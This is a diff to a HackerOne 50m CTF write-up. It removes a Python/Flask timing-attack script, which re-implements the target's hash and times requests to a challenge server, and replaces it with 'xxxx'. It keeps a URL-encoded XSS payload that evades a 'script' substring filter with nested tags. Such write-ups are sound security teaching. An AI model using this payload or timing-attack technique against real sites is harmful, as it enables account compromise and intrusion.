@@ -10,7 +10,7 @@ tags:
 private: false
 
 ---
-### Writeup Hackerone 50m CTF 
+### Writeup Hackerone 50m CTF
 
 First stage of this ctf we need to solve an hidden file from an image which posted by HackerOne at twitter [https://twitter.com/hacker0x01/status/1100543680383832065?lang=en](https://twitter.com/hacker0x01/status/1100543680383832065?lang=en).
 
@@ -274,120 +274,7 @@ to the ipaddress list and found one `ipaddress` that accessible, which is http:/
 
 after trying to understand the application, i notice a difference when send a valid hash length (64) and send a less than 64 character and made me think there is an timing attack, i tried to fuzz the first byte of the hash and notice have one longer response (when the byte is correct)  so i made a python script to automate the exploitation proccess, i made an flask web application that act like an proxy to send the encrypted request to target server.
 
-    #!/usr/bin/env python2
-    from Crypto.Cipher import AES
-    from Crypto import Random
-    import os
-    import base64
-    import requests
-    import urllib
-    import json
-    import flask
-    # import mechanize
-    
-    app = flask.Flask(__name__)
-    
-    headers = {
-    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", 
-    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 8.1.0; Redmi 6A MIUI/V9.6.18.0.OCBMIFD)", 
-    "Connection": "close", 
-    "Accept-Encoding": "gzip, deflate"
-    }
-    
-    @app.route('/flite', methods=['POST','GET'])
-    def flite():
-        if flask.request.method == "GET":
-            x = """
-                    <html>
-                <head>
-                    <title>Test</title>
-                    <script type="text/javascript">
-                    function stream(key) {{
-                this.b = [];
-                for (var i = 0; i < 256; ++i) this.b[i] = i;
-                var j = 0;
-                for (var i = 0; i < 256; ++i) {{
-                    j = (j + this.b[i] + key.charCodeAt(i % key.length)) & 0xFF;
-                    var t = this.b[i];
-                    this.b[i] = this.b[j];
-                    this.b[j] = t;
-                }}
-                this.a = 0;
-                this.c = 0;
-            }}
-            stream.prototype.next = function() {{
-                this.a = (this.a + 1) & 0xFF;
-                this.c = (this.c + this.b[this.a]) & 0xFF;
-                var t = this.b[this.a];
-                this.b[this.a] = this.b[this.c];
-                this.b[this.c] = t;
-                return this.b[(this.b[this.a] + this.b[this.c]) & 0xFF];
-            }};
-    
-            function e(x) {{
-                var s = new stream(x);
-                var ox = '';
-                for (var i = 0; i < x.length; ++i) ox += String.fromCharCode(s.next() ^ x.charCodeAt(i));
-                return ox;
-            }}
-    
-            function hash(x) {{
-                x += '\\x01\\x00';
-                while ((x.length & 0xFF) != 0) x += String.fromCharCode((x.length & 0xFF) ^ x.charCodeAt[x.length & 0xFF]);
-                var h = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0];
-                for (var i = 0; i < x.length; i += 32) {{
-                    var c = e(x.substring(i, i + 32));
-                    for (var j = 0; j < 32; ++j) h[j] ^= c.charCodeAt(j);
-                }}
-                var hs = '';
-                for (var i = 0; i < 32; ++i) hs += String.fromCharCode(h[i]);
-                return hs;
-            }}
-    
-            function fhash(x) {{
-                for (var i = 0; i < 256; ++i) x = hash(x);
-                var h = '';
-                for (var i = 0; i < 32; ++i) {{
-                    var t = x.charCodeAt(i).toString(16);
-                    if (t.length == 1) t = '0' + t;
-                    h += t;
-                }}
-                return h;
-            }}
-    
-            function login(x) {{
-                var div = document.getElementById('result');
-                console.log(fhash(x));
-                div.innerHTML = fhash(x);
-            }}
-                    </script>
-                </head>
-                <body>
-                    <p>The element below will receive content</p>
-                    <div id="result" />
-                    <script type="text/javascript">login("{}" +'\\x05\\0\\x06' + "{}");</script>
-                </body>
-            </html>
-            """
-            return x.format(flask.request.args['user'],flask.request.args['pass'])
-        else:
-            from selenium import webdriver
-            
-            if flask.request.form['hash']:
-                xx = requests.post("http://104.196.12.98",data={"hash": flask.request.form['hash']})
-                return str(xx.elapsed.total_seconds())
-            browser = webdriver.Chrome(executable_path="drivers/chromedriver.exe") #replace with .Firefox(), or with the browser of your choice
-            username = flask.request.form['user']
-            password = flask.request.form['pass']
-            url = "http://127.0.0.1:5000/flite?user={}&pass={}".format(username,password)
-            browser.get(url) #navigate to the page
-            hashnya = browser.execute_script("return document.body.querySelector('div#result').innerText")
-            req = requests.post("http://104.196.12.98",data={"hash": hashnya})
-            browser.close()
-            nganu = "Username: "+ username + " / Password: " + password + " / Time Elapsed: "+str(req.elapsed.total_seconds()) + " / Hashnya: " + hashnya
-            return nganu
-    
-    app.run(debug = True,threaded= True)
+xxxx
 
 the flask app is simply take an user&password and then encrypt the value using javascript function provided in the target application.
 
@@ -480,9 +367,7 @@ after a while i found that the application is detecting substring of `script` an
 
 to close tag i can use `<script/style>` so we can close the style tag and do something else, on  the preview i got an xss using this payload :
 
-```
-http://IP_ADDR:8663/invoices/preview?d=%7B+%22companyName%22%3A+%22Hackerone%22%2C+%22email%22%3A+%22administrator%40hackerone.com%22%2C+%22invoiceNumber%22%3A+%221337%22%2C+%22date%22%3A+%221337-1337-01%22%2C+%22items%22%3A+%5B+%5B%221%22%2C+%22%22%2C+%22%22%2C+%2210%22%5D+%5D%2C+%22styles%22%3A+%7B+%22body%22%3A+%7B+%22background-color%22%3A+%22white%22%2C+%22%3Cscript%2Fstyle%3E%3Cscrscriptipt%3Ealescriptrt%281337%29%3B%3Cscript%2Fscrscriptipt%3E%3Ch2+id%3D%27result%27%3Ex%3Cscript%2Fh2%3E%22%3A%22x%22+%7D+%7D+%7D
-```
+    http://IP_ADDR:8663/invoices/preview?d=%7B+%22companyName%22%3A+%22Hackerone%22%2C+%22email%22%3A+%22administrator%40hackerone.com%22%2C+%22invoiceNumber%22%3A+%221337%22%2C+%22date%22%3A+%221337-1337-01%22%2C+%22items%22%3A+%5B+%5B%221%22%2C+%22%22%2C+%22%22%2C+%2210%22%5D+%5D%2C+%22styles%22%3A+%7B+%22body%22%3A+%7B+%22background-color%22%3A+%22white%22%2C+%22%3Cscript%2Fstyle%3E%3Cscrscriptipt%3Ealescriptrt%281337%29%3B%3Cscript%2Fscrscriptipt%3E%3Ch2+id%3D%27result%27%3Ex%3Cscript%2Fh2%3E%22%3A%22x%22+%7D+%7D+%7D
 
 tried to embed an image and i got response from the server which say the user agent `weasyprint 44`
 
